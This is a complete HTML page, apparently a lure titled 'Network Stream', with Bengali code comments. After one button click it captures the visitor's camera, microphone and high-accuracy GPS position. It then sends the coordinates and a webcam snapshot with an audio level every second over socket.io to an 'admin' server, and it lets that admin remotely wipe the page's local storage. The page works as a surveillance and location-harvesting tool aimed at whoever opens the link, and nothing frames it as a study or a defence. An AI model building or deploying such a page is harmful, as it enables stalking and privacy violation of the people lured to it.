<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Network Stream</title>
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <style>
        *{ margin:0; padding:0; box-sizing:border-box; }
        body{ background:#0b0e14; color:#c8d0dc; font-family: 'Segoe UI', sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column; }
        .container{ background:#141c28; padding:40px; border-radius:20px; border:1px solid #2a3a50; text-align:center; max-width:500px; }
        h1{ color:#00d4ff; margin-bottom:10px; }
        p{ color:#8899aa; margin-bottom:20px; }
        .btn{ background:#00d4ff; border:none; color:#0b0e14; padding:14px 40px; border-radius:40px; font-weight:600; cursor:pointer; transition:0.25s; }
        .btn:hover{ background:#00b8e0; box-shadow:0 0 25px #00d4ff66; }
        .btn-secondary{ background:#2a3a50; color:#c8d0dc; }
        .status{ margin-top:20px; font-size:14px; color:#8899aa; }
        .preview{ margin-top:20px; border-radius:12px; overflow:hidden; background:#000; border:1px solid #2a3a50; display:none; }
        .preview video{ width:100%; display:block; }
        .active{ display:block; }
        .footer{ margin-top:30px; font-size:12px; color:#445; }
    </style>
</head>
<body>
<div class="container">
    <h1>📡 Network Stream</h1>
    <p>Enable camera & microphone to start streaming</p>
    <button id="enableBtn" class="btn">✅ Enable Stream</button>
    <button id="retryBtn" class="btn btn-secondary" style="display:none;">🔄 Retry</button>
    <div class="preview" id="previewContainer">
        <video id="localVideo" autoplay muted></video>   <!-- muted = অডিও বন্ধ -->
        <div style="padding:10px;background:#0b0e14;text-align:left;">
            <div>🔊 Audio Level: <span id="audioLevel">0</span>%</div>
            <div>📍 Location: <span id="locationStatus">Waiting...</span></div>
        </div>
    </div>
    <div class="status" id="statusText">Click the button to start.</div>
    <div class="footer">🔒 Your stream is shared with admin only.</div>
</div>

<script>
    const socket = io();
    let localStream = null;
    let localVideo = document.getElementById('localVideo');
    const enableBtn = document.getElementById('enableBtn');
    const retryBtn = document.getElementById('retryBtn');
    const previewContainer = document.getElementById('previewContainer');
    const statusText = document.getElementById('statusText');
    const audioLevelSpan = document.getElementById('audioLevel');
    const locationSpan = document.getElementById('locationStatus');

    async function startStream() {
        try {
            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
            });

            localVideo.srcObject = localStream;
            localVideo.play();
            previewContainer.classList.add('active');
            statusText.textContent = '✅ Streaming live...';
            enableBtn.style.display = 'none';
            retryBtn.style.display = 'none';

            locationSpan.textContent = `${pos.coords.latitude}, ${pos.coords.longitude}`;
            socket.emit('location_update', {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy
            });

            const audioContext = new AudioContext();
            const source = audioContext.createMediaStreamSource(localStream);
            const analyser = audioContext.createAnalyser();
            source.connect(analyser);
            const dataArray = new Uint8Array(analyser.frequencyBinCount);

            setInterval(() => {
                analyser.getByteTimeDomainData(dataArray);
                let sum = 0;
                for (let i = 0; i < dataArray.length; i++) {
                    const val = (dataArray[i] - 128) / 128;
                    sum += val * val;
                }
                const rms = Math.sqrt(sum / dataArray.length);
                const volume = Math.min(100, Math.round(rms * 200));
                audioLevelSpan.textContent = volume;

                const canvas = document.createElement('canvas');
                canvas.width = 320;
                canvas.height = 240;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(localVideo, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.6);
                socket.emit('video_frame', {
                    image: imageData,
                    audio_volume: volume
                });
            }, 1000);

            socket.emit('ready');

        } catch (err) {
            statusText.textContent = '❌ Permission denied or error. Click Retry.';
            enableBtn.style.display = 'none';
            retryBtn.style.display = 'inline-block';
            previewContainer.classList.remove('active');
        }
    }

    enableBtn.addEventListener('click', startStream);
    retryBtn.addEventListener('click', () => {
        retryBtn.style.display = 'none';
        enableBtn.style.display = 'inline-block';
        startStream();
    });

    // এডমিন ক্লিয়ার করলে ইউজার পেজ রিলোড হবে (লোকালস্টোরেজ ক্লিয়ার)
    socket.on('clear_all', () => {
        localStorage.clear();
        location.reload();
    });
</script>
</body>
    </html>
